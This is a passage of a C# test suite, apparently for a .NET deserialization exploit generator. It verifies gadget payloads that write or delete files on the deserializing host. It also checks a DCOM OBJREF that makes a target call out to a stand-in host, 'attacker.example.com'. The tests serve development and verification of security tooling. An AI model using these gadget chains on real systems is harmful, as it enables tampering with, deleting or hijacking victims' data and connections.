                RunSTA(delegate { DeserializeAs("bf", payload); });

                AssertTrue(File.Exists(target), "the payload wrote the target file");
                AssertEqual(body, File.ReadAllText(target),
                    "the target holds exactly the decoded text of the deleted fixture");
                byte[] written = File.ReadAllBytes(target);
                AssertTrue(!(written.Length >= 3 && written[0] == 0xEF && written[1] == 0xBB && written[2] == 0xBF),
                    "File.WriteAllText(string,string) writes UTF-8 with no BOM, so the BOM is not re-added");
            }
            finally { SafeDelete(fixture); SafeDelete(target); }

            // A missing or unreadable content file is an error, never inline text.
            RunResult missing = GenerateFileOps(1,
                FileOpsPath("zz_target.txt") + ";" + FileOpsPath("no_such_content_file.txt"));
            AssertTrue(!missing.Success, "a missing local content file fails generation");
            AssertTrue((missing.ErrorMessage ?? "").Contains("LOCAL file"),
                "the message says the second field is a local file: " + missing.ErrorMessage);
            AssertTrue((missing.ErrorMessage ?? "").Contains("never inline text"),
                "the message rules out the inline-text reading: " + missing.ErrorMessage);
        }

        // Both selectors reject anything outside their range instead of quietly falling
        // back to a default, which would hide a typo behind a payload nobody asked for.
        private static void FileOperationsOptionsAreValidated()
        {
            string ok = FileOpsPath("zz_a.txt") + ";" + FileOpsPath("aa_b.txt");

            foreach (string bad in new[] { "nope", "0", "6", "-1", "" })
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = ok;
                ia.Test = false;
                ia.ExtraArguments = new List<string> { "--variant", bad };
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = FileOpsGadget,
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, "--variant " + bad + " is rejected");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("variant must be 1, 2, 3, 4, or 5",
                        StringComparison.OrdinalIgnoreCase) >= 0,
                    "--variant " + bad + " reports the allowed values: " + r.ErrorMessage);
            }

            foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = ok;
                ia.Test = false;
                ia.ExtraArguments = new List<string>
                {
                    "--variant", "2",
                    "--" + TypeConfuseDelegateGenerator.RootContainerOptionName, bad,
                };
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = FileOpsGadget,
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
                AssertTrue(!r.Success, "--rootcontainer " + bad + " is rejected");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("rootcontainer must be 1, 2, or 3",
                        StringComparison.OrdinalIgnoreCase) >= 0,
                    "--rootcontainer " + bad + " reports the allowed values: " + r.ErrorMessage);
            }

            for (int container = 1; container <= 3; container++)
                AssertTrue(GenerateFileOps(2, ok, "BinaryFormatter", container, false).Success,
                    "--rootcontainer " + container + " is accepted");
        }

        // The container swap changes the serialized ROOT and nothing else, exactly as it
        // does for the command and XAML paths. Omitting the option must equal container 1.
        private static void FileOperationsRootContainersSwapOnlyTheRoot()
        {
            const string sortedSet = "System.Collections.Generic.SortedSet`1";
            const string treeSet = "System.Collections.Generic.TreeSet`1";
            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";
            string cmd = FileOpsPath("zz_c_source.txt") + ";" + FileOpsPath("aa_c_dest.txt");

            AssertTrue(BytesEqual(Bytes(GenerateFileOps(2, cmd, "BinaryFormatter", null, false).Raw),
                                  Bytes(GenerateFileOps(2, cmd, "BinaryFormatter", 1, false).Raw)),
                "no --rootcontainer equals --rootcontainer 1 byte-for-byte");

            string c1 = FileOpsStreamText(2, cmd, 1);
            string c2 = FileOpsStreamText(2, cmd, 2);
            string c3 = FileOpsStreamText(2, cmd, 3);

            AssertTrue(c1.Contains(sortedSet), "container 1 serializes a SortedSet root");
            AssertTrue(c2.Contains(sortedDict) && c2.Contains(treeSet) && !c2.Contains(sortedSet),
                "container 2 serializes a SortedDictionary root with its TreeSet backing set and no SortedSet name");
            AssertTrue(c3.Contains(treeSet) && !c3.Contains(sortedDict) && !c3.Contains(sortedSet),
                "container 3 serializes a bare TreeSet root");

            foreach (string text in new[] { c1, c2, c3 })
            {
                AssertTrue(text.Contains("CompareOrdinal"), "every container keeps the ordinal comparison");
                AssertTrue(text.Contains("System.IO.File"), "every container keeps the file sink");
            }
        }

        // Formatter-expansion result, locked instead of assumed. The candidate set is the
        // four formatters GenericGenerator.Serialize can even produce; the public-member
        // serializers cannot rebuild a MulticastDelegate invocation list at all. Of those
        // four, SoapFormatter is impossible for the same reason it is for every container
        // gadget: each root is a generic type and SoapFormatter cannot serialize one.
        private static void FileOperationsCannotUseSoapFormatter()
        {
            AssertTrue(!Gadget(FileOpsGadget).IsSupported("SoapFormatter"),
                "SoapFormatter is not advertised by " + FileOpsGadget);
            foreach (string f in FileOpsFormatters)
                AssertTrue(Gadget(FileOpsGadget).IsSupported(f), f + " is advertised");

            string cmd = FileOpsPath("zz_soap_source.txt") + ";" + FileOpsPath("aa_soap_dest.txt");
            for (int container = 1; container <= 3; container++)
            {
                var gen = new TypeConfuseDelegateFileOperationsGenerator();
                gen.Options().Parse(new[]
                {
                    "--variant", "2",
                    "--" + TypeConfuseDelegateGenerator.RootContainerOptionName, container.ToString(),
                });
                InputArgs ia = new InputArgs();
                ia.Cmd = cmd;
                ia.Test = false;
                AssertThrows(delegate { gen.Generate("SoapFormatter", ia); },
                    "SoapFormatter cannot serialize the generic root of container " + container);
            }
        }

        // Both strings this gadget carries are user data the target uses literally, so
        // --minify must never rewrite them. The XML minifier is not text preserving
        // (XmlXSLTMinifier trims text nodes, the XmlDocument round trip drops a CR, and a
        // dirty-match pass collapses "; "), so the gadget verifies the serialized payload
        // and refuses instead of delivering a rewritten file.
        //
        // Each case below is measured, not assumed: the same input is fired through the
        // BinaryFormatter (binary, carries the string verbatim) and asserted to arrive
        // intact, so a refusal can never be blamed on the input itself.
        private static void FileOperationsRefuseLossyMinification()
        {
            // What the XML minifier really rewrites, and what it leaves alone.
            var lossy = new[] { "!a\r\nb", "!one line\n", "!one line\r\n", "!a; b; c" };
            var safe = new[] { "!one line no newline", "!a\nb", "!a  b" };

            foreach (string body in lossy)
                AssertFileOpsMinifyVerdict(body, false);
            foreach (string body in safe)
                AssertFileOpsMinifyVerdict(body, true);

            // The limitation belongs to the XML minifier, not to the gadget: the binary
            // formatters minify the SAME lossy input and deliver it byte for byte.
            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
                foreach (string body in lossy)
                    AssertFileOpsWriteArrivesIntact(body, formatter, true);
        }

        // Assert whether a minified NetDataContractSerializer write payload is allowed for
        // this content, and prove the same content is deliverable without --minify.
        private static void AssertFileOpsMinifyVerdict(string body, bool expectAllowed)
        {
            string label = "content " + Preview(body);
            string fixture = TestArtifactPath("ysonet_fileops_minify_probe.txt");
            string target = FileOpsPath("zz_minify_probe.txt");
            SafeDelete(fixture);
            try
            {
                // Written directly rather than through WriteTestArtifact because the exact
                // encoding is the point (UTF-8, no BOM). Verified straight away, so an
                // antivirus deletion shows up as this message and not as a puzzling refusal.
                File.WriteAllText(fixture, body, new UTF8Encoding(false));
                AssertTrue(File.Exists(fixture), "the content fixture survived the write (" + label + ")");

                RunResult minified = GenerateFileOps(1, target + ";" + fixture,
                    "NetDataContractSerializer", null, true);

                if (expectAllowed)
                {
                    AssertTrue(minified.Success,
                        "minified NDCS is allowed for content the minifier leaves alone (" + label
                        + "): " + minified.ErrorMessage);
                }
                else
                {
                    AssertTrue(!minified.Success,
                        "minified NDCS is refused for content the minifier would rewrite (" + label + ")");
                    AssertTrue((minified.ErrorMessage ?? "").Contains("cannot use --minify with NetDataContractSerializer"),
                        "the refusal names the combination: " + minified.ErrorMessage);
                    AssertTrue((minified.ErrorMessage ?? "").Contains("BinaryFormatter"),
                        "the refusal offers the formatters that do carry it: " + minified.ErrorMessage);
                }

                // Either way the un-minified NDCS payload must still deliver it intact, so
                // the refusal is about --minify and nothing else.
                AssertFileOpsWriteArrives(body, fixture, target, "NetDataContractSerializer", false, label);
            }
            finally { SafeDelete(fixture); SafeDelete(target); }
        }

        private static void AssertFileOpsWriteArrivesIntact(string body, string formatter, bool minify)
        {
            string fixture = TestArtifactPath("ysonet_fileops_binary_probe.txt");
            string target = FileOpsPath("zz_binary_probe.txt");
            SafeDelete(fixture);
            try
            {
                File.WriteAllText(fixture, body, new UTF8Encoding(false));
                AssertTrue(File.Exists(fixture), "the content fixture survived the write");
                AssertFileOpsWriteArrives(body, fixture, target, formatter, minify,
                    formatter + (minify ? " --minify" : "") + " content " + Preview(body));
            }
            finally { SafeDelete(fixture); SafeDelete(target); }
        }

        private static void AssertFileOpsWriteArrives(string body, string fixture, string target,
            string formatter, bool minify, string label)
        {
            SafeDelete(target);
            RunResult r = GenerateFileOps(1, target + ";" + fixture, formatter, null, minify);
            AssertTrue(r.Success, "the write payload generates (" + label + "): " + r.ErrorMessage);
            RunSTA(delegate { DeserializeAs(FileOpsDeserTag(formatter), Bytes(r.Raw)); });
            AssertTrue(File.Exists(target), "the payload wrote the target file (" + label + ")");
            AssertEqual(body, File.ReadAllText(target),
                "the delivered text is byte-for-byte what the operator supplied (" + label + ")");
            SafeDelete(target);
        }

        // A readable one-line form of a content fixture for an assertion message.
        private static string Preview(string value)
        {
            string s = (value ?? "").Replace("\r", "\\r").Replace("\n", "\\n");
            return "\"" + (s.Length <= 40 ? s : s.Substring(0, 40) + "...") + "\"";
        }

        // A target path is resolved by the DESERIALIZING process, not by ysonet. Proven with
        // a child ysonet.exe whose working directory the test controls, so the runner's own
        // process-wide current directory is never touched.
        private static void FileOperationsTargetPathsAreRelativeToTheTarget()
        {
            string exeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string exe = Path.Combine(exeDir, "ysonet.exe");
            AssertTrue(File.Exists(exe), "ysonet.exe sits next to the test exe: " + exe);

            string workDir = TestArtifactPath("ysonet_fileops_workdir");
            SafeDeleteDir(workDir);
            Directory.CreateDirectory(workDir);
            try
            {
                const string relative = "zz_relative_target.txt";
                var psi = new System.Diagnostics.ProcessStartInfo(exe);
                psi.Arguments = "-g " + FileOpsGadget + " -f BinaryFormatter --variant 5 -c \""
                    + relative + "\" -t -o base64";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = workDir;   // the only thing that decides where it lands

                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(60000)) { try { proc.Kill(); } catch { } }
                }

                AssertTrue(File.Exists(Path.Combine(workDir, relative)),
                    "the relative target path resolved against the DESERIALIZING process's working directory");
                AssertTrue(!File.Exists(Path.Combine(exeDir, relative)),
                    "nothing was written next to ysonet.exe");
            }
            finally { SafeDeleteDir(workDir); }
        }

        // The interactive editor must offer all five operation labels plus the root
        // container as a separate plain option, start on the write default, and emit the
        // NUMBER on the command line rather than the human label.
        private static void EditorExposesTheFileOperationVariants()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest(FileOpsGadget);

            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null, "the variant field is offered");
            var declared = Gadget(FileOpsGadget).Variants();
            AssertEqual(5, declared.Count, "five operations are declared");
            AssertTrue(variant.Choices != null && variant.Choices.Count == 5,
                "all five operation labels are offered");
            for (int i = 0; i < declared.Count; i++)
                AssertEqual(declared[i].Label, variant.Choices[i], "label " + (i + 1) + " is in variant order");
            AssertEqual(declared[0].Label, variant.Value, "the editor starts on the write default");

            EditableField container = FindEditable(fields,
                TypeConfuseDelegateGenerator.RootContainerOptionName);
            AssertTrue(container != null && !container.Hidden,
                "the root container is a plain option, offered for every operation");

            FindEditable(fields, "command").Value = FileOpsPath("zz_a.txt") + ";" + FileOpsPath("aa_b.txt");
            string flag = VariantFlagFor(Gadget(FileOpsGadget));

            variant.Value = declared[4].Label;   // the empty-file operation
            string line = ed.GadgetCommandLineForTest();
            AssertTrue(line.Contains(flag + " 5"), "the echoed command line carries the number: " + line);
            AssertTrue(!line.Contains(declared[4].Label),
                "the human label never leaks into the command line: " + line);
        }

        // ---- TempFileCollection (deferred target file delete) -------------------
        //
        // System.CodeDom.Compiler.TempFileCollection is field-serialized and its
        // finalizer/Dispose calls File.Delete over a private Hashtable of paths. The gadget
        // emits it through an ISerializable marshal and never builds a live one, so the tests
        // below check the WIRE shape and the parsing here; the real deletion is proven in the
        // FULL tier by FireTempFileCollectionDeletes.
        //
        // Every path any test here puts into a payload is either nonexistent or inside the
        // test's own artifact directory, and every deserialize suppresses the finalizer it
        // just armed. Nothing outside the test tree can ever be named.

        private const string TempFilesGadget = "TempFileCollection";

        private static readonly string[] TempFilesFormatters =
        {
            "BinaryFormatter", "SoapFormatter", "LosFormatter",
            "NetDataContractSerializer", "DataContractSerializer",
        };

        // The XML formatters among them: the only ones whose --minify pass can rewrite a path.
        private static readonly string[] TempFilesXmlFormatters =
            { "SoapFormatter", "NetDataContractSerializer", "DataContractSerializer" };

        // The deserializer tag for each of them (same tags DeserializeAs uses).
        private static string TempFilesDeserTag(string formatter)
        {
            switch (formatter)
            {
                case "BinaryFormatter": return "bf";
                case "SoapFormatter": return "soap";
                case "LosFormatter": return "los";
                case "NetDataContractSerializer": return "ndc";
                case "DataContractSerializer": return "dcs";
                default: throw new Exception("no deserializer tag for " + formatter);
            }
        }

        private static RunResult GenerateTempFiles(string formatter, bool minify,
            bool test, params string[] paths)
        {
            AssertTrue(paths != null && paths.Length > 0, "the test supplied at least one path");
            InputArgs ia = new InputArgs();
            ia.Cmd = paths[0];
            ia.Test = test;
            ia.Minify = minify;
            var extra = new List<string>();
            for (int i = 1; i < paths.Length; i++)
            {
                extra.Add("--" + TempFileCollectionGenerator.ExtraFileOptionName);
                extra.Add(paths[i]);
            }
            ia.ExtraArguments = extra;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = TempFilesGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static RunResult GenerateTempFiles(params string[] paths)
        {
            return GenerateTempFiles("BinaryFormatter", false, false, paths);
        }

        // Deserialize a TempFileCollection payload and hand the real object to the caller,
        // ALWAYS suppressing its finalizer afterwards. That is what makes it safe to
        // reconstruct the type inside the test runner: the object is inspected and then
        // disarmed, so nothing is left on the finalizer queue to delete a path later.
        private static void WithDeserializedTempFileCollection(string formatter, object raw,
            Action<object> inspect)
        {
            object obj = null;
            try
            {
                obj = DeserializeTempFileCollection(formatter, raw);
                inspect(obj);
            }
            finally
            {
                if (obj != null) GC.SuppressFinalize(obj);
            }
        }

        // The path -> keepFile map the target's Delete() reads, pulled off a deserialized
        // instance by reflection. Ordinal keys, because the framework's own lookup uses the
        // exact string it copied out of the table.
        private static Dictionary<string, object> TempFilesTableOf(object collection)
        {
            var field = collection.GetType().GetField("files",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            AssertTrue(field != null, "TempFileCollection still has its private 'files' field");
            var table = field.GetValue(collection) as System.Collections.Hashtable;
            AssertTrue(table != null, "the 'files' field carries a Hashtable");
            var map = new Dictionary<string, object>(StringComparer.Ordinal);
            foreach (System.Collections.DictionaryEntry e in table)
                map[(string)e.Key] = e.Value;
            return map;
        }

        private static object TempFilesFieldOf(object collection, string name)
        {
            var field = collection.GetType().GetField(name,
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            AssertTrue(field != null, "TempFileCollection still has its private '" + name + "' field");
            return field.GetValue(collection);
        }

        // Every advertised formatter, raw and minified, must rebuild the REAL framework type
        // with exactly the four fields the target's Delete() path reads. A wire shape that
        // merely generates proves nothing: if a field name drifts or a value arrives as true,
        // the payload silently deletes nothing.
        private static void TempFileCollectionCarriesTheRealTypeAndFields()
        {
            // Deliberately nonexistent, and named so a stray delete would be obvious.
            string first = TestArtifactPath("ysonet_tfc_never_exists_1.txt");
            string second = TestArtifactPath("ysonet_tfc_never_exists_2.txt");
            AssertTrue(!File.Exists(first) && !File.Exists(second),
                "the round-trip paths do not exist, so even a leaked finalizer has nothing to delete");

            Type real = Type.GetType(TempFileCollectionGenerator.TempFileCollectionTypeName, true);

            foreach (string formatter in TempFilesFormatters)
            {
                foreach (bool minify in new[] { false, true })
                {
                    string label = formatter + (minify ? " --minify" : "");
                    RunResult r = GenerateTempFiles(formatter, minify, false, first, second);
                    AssertTrue(r.Success, label + " generates: " + r.ErrorMessage);

                    WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                    {
                        AssertTrue(obj != null, label + " deserializes to an object");
                        AssertEqual(real, obj.GetType(),
                            label + " rebuilds the real System.CodeDom.Compiler.TempFileCollection");

                        AssertTrue(TempFilesFieldOf(obj, "basePath") == null, label + ": basePath is null");
                        AssertTrue(TempFilesFieldOf(obj, "tempDir") == null, label + ": tempDir is null");
                        AssertEqual(false, TempFilesFieldOf(obj, "keepFiles"), label + ": keepFiles is false");

                        var table = TempFilesTableOf(obj);
                        AssertEqual(2, table.Count, label + ": both paths arrived");
                        foreach (string path in new[] { first, second })
                        {
                            AssertTrue(table.ContainsKey(path), label + ": the path arrived verbatim (" + path + ")");
                            AssertEqual(false, table[path],
                                label + ": the per-file keepFile flag is false, so Delete() removes it");
                        }
                    });
                }
            }
        }

        // -c plus every repeated --extrafile, in order, with case-insensitive duplicates
        // collapsed and empty values refused. Also: no path I/O at generation time - a path
        // that happens to EXIST on this machine is still carried as the path, never read.
        private static void TempFileCollectionOptionParsing()
        {
            // Repeatable option, order preserved.
            RunResult many = GenerateTempFiles(@"C:\ysonet\a.txt", @"C:\ysonet\b.txt", @"C:\ysonet\c.txt");
            AssertTrue(many.Success, "three paths generate: " + many.ErrorMessage);
            WithDeserializedTempFileCollection("BinaryFormatter", many.Raw, delegate (object obj)
            {
                var table = TempFilesTableOf(obj);
                AssertEqual(3, table.Count, "-c plus two --extrafile values give three entries");
                foreach (string p in new[] { @"C:\ysonet\a.txt", @"C:\ysonet\b.txt", @"C:\ysonet\c.txt" })
                    AssertTrue(table.ContainsKey(p), "entry present: " + p);
            });

            // Case-insensitive duplicates collapse to one entry. A Hashtable cannot hold two
            // equal keys, and the real AddFile throws on a duplicate, so collapsing is the
            // only reading of "delete it twice" that makes sense.
            RunResult dupes = GenerateTempFiles(@"C:\ysonet\Dup.txt", @"C:\YSONET\dup.TXT", @"C:\ysonet\other.txt");
            AssertTrue(dupes.Success, "a case-different duplicate is accepted: " + dupes.ErrorMessage);
            WithDeserializedTempFileCollection("BinaryFormatter", dupes.Raw, delegate (object obj)
            {
                var table = TempFilesTableOf(obj);
                AssertEqual(2, table.Count, "the case-different duplicate collapsed into one entry");
                AssertTrue(table.ContainsKey(@"C:\ysonet\Dup.txt"),
                    "the FIRST spelling is the one that is kept");
                AssertTrue(table.ContainsKey(@"C:\ysonet\other.txt"), "the distinct path survived");
            });

            // An exact duplicate is equally harmless.
            RunResult exact = GenerateTempFiles(@"C:\ysonet\same.txt", @"C:\ysonet\same.txt");
            AssertTrue(exact.Success, "an exact duplicate is accepted: " + exact.ErrorMessage);
            WithDeserializedTempFileCollection("BinaryFormatter", exact.Raw, delegate (object obj)
            {
                AssertEqual(1, TempFilesTableOf(obj).Count, "an exact duplicate collapsed too");
            });

            // Empty / whitespace-only inputs are refused, not silently dropped.
            foreach (string bad in new[] { "", " ", "\t" })
            {
                RunResult noCmd = GenerateTempFiles("BinaryFormatter", false, false, bad);
                AssertTrue(!noCmd.Success, "an empty -c is refused (" + Preview(bad) + ")");
                AssertTrue((noCmd.ErrorMessage ?? "").Contains("-c"),
                    "the refusal names -c: " + noCmd.ErrorMessage);

                RunResult badExtra = GenerateTempFiles("BinaryFormatter", false, false, @"C:\ysonet\a.txt", bad);
                AssertTrue(!badExtra.Success, "an empty --extrafile is refused (" + Preview(bad) + ")");
                AssertTrue((badExtra.ErrorMessage ?? "").Contains(
                    TempFileCollectionGenerator.ExtraFileOptionName),
                    "the refusal names the option: " + badExtra.ErrorMessage);
            }

            // Escaping is the serializer's job, not a hand-built template's: a path full of
            // XML and JSON metacharacters must survive every advertised formatter unchanged.
            const string nasty = @"C:\ysonet\<a>&""'quote--;\x.txt";
            foreach (string formatter in TempFilesFormatters)
            {
                RunResult r = GenerateTempFiles(formatter, false, false, nasty);
                AssertTrue(r.Success, formatter + " generates a metacharacter path: " + r.ErrorMessage);
                WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                {
                    AssertTrue(TempFilesTableOf(obj).ContainsKey(nasty),
                        formatter + " carried the metacharacter path verbatim");
                });
            }

            // No path I/O here: a file that EXISTS on this machine is still just a path. (The
            // shell-command gadgets read -c from a file when one exists; this one must not.)
            string existing = WriteTestArtifact("ysonet_tfc_existing_input.txt", "this text must never be read");
            try
            {
                RunResult r = GenerateTempFiles(existing);
                AssertTrue(r.Success, "an existing local path generates: " + r.ErrorMessage);
                WithDeserializedTempFileCollection("BinaryFormatter", r.Raw, delegate (object obj)
                {
                    var table = TempFilesTableOf(obj);
                    AssertEqual(1, table.Count, "one entry");
                    AssertTrue(table.ContainsKey(existing),
                        "an existing local path is carried as the PATH, not replaced by its contents");
                });
                AssertTrue(File.Exists(existing), "generation did not delete or move the local file");
                AssertEqual("this text must never be read", File.ReadAllText(existing),
                    "generation did not touch the local file's contents");
            }
            finally { SafeDelete(existing); }
        }

        // The interactive info panel only renders BodyRows lines, so a long
        // AdditionalInfo() silently pushes "Formatters:", "Command input:" and the category
        // summary off the visible area with no error anywhere. The shared canary
        // (ModuleInfoPanelShowsFacts) only guards the FIRST gadget alphabetically, so this
        // gadget checks its own panel - its AdditionalInfo has real preconditions to state
        // and is the kind of text that grows.
        private static void TempFileCollectionInfoPanelStillShowsItsFacts()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            // A pessimistically NARROW info column: the panel is one of four columns, so a
            // realistic terminal gives it more room than this.
            string[] lines = ed.ModuleInfoLinesForTest(TempFilesGadget, 34);
            int visible = ModuleEditor.BodyRowsForTest;
            AssertTrue(lines.Length > 0, "the info panel renders for " + TempFilesGadget);

            // The panel uses the COMPACT category form, so the summary is one
            // "Categories: ..." line rather than the detailed per-axis block.
            foreach (string fact in new[] { "Formatters:", "Command input:", "Categories" })
            {
                int at = -1;
                for (int i = 0; i < lines.Length; i++)
                    // The category summary lines carry their own indentation.
                    if (lines[i].TrimStart().StartsWith(fact, StringComparison.Ordinal)) { at = i; break; }
                AssertTrue(at >= 0, "the panel states " + fact);
                AssertTrue(at < visible, fact + " is still on screen (row " + at + " of "
                    + visible + " visible; shorten AdditionalInfo() and move the detail into "
                    + "the option help)");
            }

            // The repeatable extra-path option must reach the editor too, so the gadget is
            // fully usable from the interactive build and not only from the command line.
            EditableField extra = FindEditable(ed.BuildFieldsForTest(TempFilesGadget),
                TempFileCollectionGenerator.ExtraFileOptionName);
            AssertTrue(extra != null && !extra.Hidden,
                "the editor offers the " + TempFileCollectionGenerator.ExtraFileOptionName + " setting");
            AssertTrue(!string.IsNullOrEmpty(extra.Help),
                "the extra-path setting carries its help text into the editor");
        }

        // A UNC path and a relative path both reach the target verbatim. Nothing is
        // canonicalized, rooted against ysonet's working directory, or expanded here - which
        // is the whole difference between a target path and a local file path.

        // ---- WbemClassObjectUnmarshal ------------------------------------------

        private const string WbemGadget = "WbemClassObjectUnmarshal";

        // Every formatter the gadget advertises. The runtime proof that each one really
        // reaches CoUnmarshalInterface is FireWbemClassObjectUnmarshalComSink in the FULL
        // tier; these normal-tier tests cover the wire shape and the refusals.
        private static readonly string[] WbemFormatters =
        {
            "BinaryFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer",
            "DataContractSerializer", "Json.NET", "FsPickler"
        };

        // Loopback everywhere. A host name would make the machine running the suite do a DNS
        // lookup, and the OBJREF is built the same way either way.
        private const string WbemLoopbackHost = "127.0.0.1";

        // Test seam: how many Wbem payloads this process generated. A gating test asserts
        // it does NOT move when the RPC capability is absent, which is how it proves the
        // helper stopped before the work rather than generating and then failing.
        internal static int WbemGenerationCount;

        private static RunResult GenerateWbem(string formatter, bool minify, int variant, string cmd)
        {
            WbemGenerationCount++;
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Minify = minify;
            ia.Test = false;
            ia.ExtraArguments = new List<string>
            {
                "--" + WbemClassObjectUnmarshalGenerator.VariantOptionName, variant.ToString()
            };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = WbemGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The OBJREF builder is the part of this gadget that is real protocol work rather
        // than serialization plumbing, so it is tested on its own: the bytes are parsed back
        // field by field against [MS-DCOM] 2.2.18. If this drifts, every formatter still
        // generates and the payload simply never calls out, which is exactly the kind of
        // silent failure a generation-only matrix cannot see.
        private static void WbemClassObjectUnmarshalBuildsAValidObjRef()
        {
            const string host = "attacker.example.com";
            byte[] objref = WbemClassObjectUnmarshalGenerator.BuildStandardObjRef(host);

            AssertEqual((uint)0x574F454D, BitConverter.ToUInt32(objref, 0),
                "the OBJREF starts with the MEOW signature");
            AssertEqual((uint)1, BitConverter.ToUInt32(objref, 4),
                "flags say OBJREF_STANDARD, which is the flavour that names a host (a captured "
                + "WMI blob is OBJREF_CUSTOM and names none)");
            AssertEqual(new Guid("DC12A681-737F-11CF-884D-00AA004B2E24"), new Guid(Slice(objref, 8, 16)),
                "the marshalled interface is IID_IWbemClassObject, which is the IID "
                + "CoUnmarshalInterface is called with");

            // STDOBJREF: flags, cPublicRefs, OXID, OID, IPID. A non-zero OXID that the target
            // cannot know is what forces it to ask the host to resolve it.
            AssertTrue(BitConverter.ToUInt64(objref, 32) != 0,
                "the OXID is non-zero, so the target has to resolve it against the host");

            // DUALSTRINGARRAY. Both counts are in USHORTs and both arrays are zero terminated.
            int arrayAt = 64;
            ushort numEntries = BitConverter.ToUInt16(objref, arrayAt);
            ushort securityOffset = BitConverter.ToUInt16(objref, arrayAt + 2);
            AssertEqual(objref.Length - (arrayAt + 4), numEntries * 2,
                "wNumEntries counts every USHORT in the string array");
            AssertTrue(securityOffset > 0 && securityOffset < numEntries,
                "wSecurityOffset points inside the array, between the string and security bindings");

            // The one string binding: an ncacn_ip_tcp tower id, then the host as a
            // null-terminated UTF-16 string.
            AssertEqual((ushort)0x0007, BitConverter.ToUInt16(objref, arrayAt + 4),
                "the string binding is ncacn_ip_tcp");
            string encoded = Encoding.Unicode.GetString(objref, arrayAt + 6, host.Length * 2);
            AssertEqual(host, encoded, "the host is carried verbatim as UTF-16");
            AssertEqual((ushort)0, BitConverter.ToUInt16(objref, arrayAt + 6 + host.Length * 2),
                "the string binding is null terminated");

            // Different hosts produce different bytes, and the same host produces the same
            // bytes: the identifiers are fixed on purpose so the output is reproducible.
            AssertTrue(!ByteEquals(objref,
                    WbemClassObjectUnmarshalGenerator.BuildStandardObjRef("other.example.com")),
                "a different host produces a different OBJREF");
            AssertTrue(ByteEquals(objref, WbemClassObjectUnmarshalGenerator.BuildStandardObjRef(host)),
                "the same host produces the same OBJREF, so payloads are reproducible");
        }

        // Every advertised formatter must name the exact target type and the one member its
        // serialization constructor reads, and must carry the blob unchanged. The blob is the
        // whole payload and the host lives inside it, so a rewritten blob is a payload that
        // deserializes on the target and calls nobody.
        private static void WbemClassObjectUnmarshalCarriesTheTargetTypeAndBlob()
        {
            byte[] expected = WbemClassObjectUnmarshalGenerator.BuildStandardObjRef(WbemLoopbackHost);
            string expectedBase64 = Convert.ToBase64String(expected);

            foreach (string formatter in WbemFormatters)
            {
                foreach (bool minify in new[] { false, true })
                {
                    string label = formatter + (minify ? " --minify" : "");
                    RunResult r = GenerateWbem(formatter, minify, 1, WbemLoopbackHost);
                    AssertTrue(r.Success, label + " generates: " + r.ErrorMessage);

                    byte[] searchable = WbemSearchableBytes(formatter, r.Raw);
                    string text = Encoding.UTF8.GetString(searchable);

                    // SoapFormatter is the one that does not spell the type out in one piece:
                    // it writes the bare name as the element and puts the CLR namespace and
                    // assembly in an xmlns, so assert both halves instead of a contiguous
                    // match that would only ever hold for the other six.
                    if (formatter == "SoapFormatter")
                    {
                        AssertTrue(text.Contains(WbemBareTypeName),
                            label + " names the " + WbemBareTypeName + " element");
                        AssertTrue(text.Contains("System.Management"),
                            label + " names the System.Management assembly in its clr namespace");
                    }
                    else
                    {
                        AssertTrue(text.Contains(WbemClassObjectUnmarshalGenerator.WbemClrName),
                            label + " names " + WbemClassObjectUnmarshalGenerator.WbemClrName);
                    }

                    AssertTrue(text.Contains(WbemClassObjectUnmarshalGenerator.BlobMemberName),
                        label + " names the " + WbemClassObjectUnmarshalGenerator.BlobMemberName
                            + " member the serialization constructor reads");

                    // The two BinaryFormatter-stream formats carry the byte[] as a record; the
                    // rest base64 it. Whitespace is stripped before comparing because base64 is
                    // whitespace insensitive, so a wrapped value is intact rather than broken.
                    if (WbemCarriesRawBytes(formatter))
                        AssertTrue(IndexOfBytes(searchable, expected) >= 0,
                            label + " carries the OBJREF bytes verbatim");
                    else
                        AssertTrue(StripWs(text).Contains(StripWs(expectedBase64)),
                            label + " carries the OBJREF as base64 that survived generation"
                                + (minify ? " and minification" : ""));
                }
            }
        }

        // -t deserializes in THIS process, so it runs the target's serialization constructor
        // here. The two variants get opposite answers, and the dividing line is WHOSE bytes
        // are in the blob:
        //
        //  - variant 1 ships an OBJREF ysonet built, so the only local effect is the callback
        //    to the host the operator named. That is what -t means on every other network
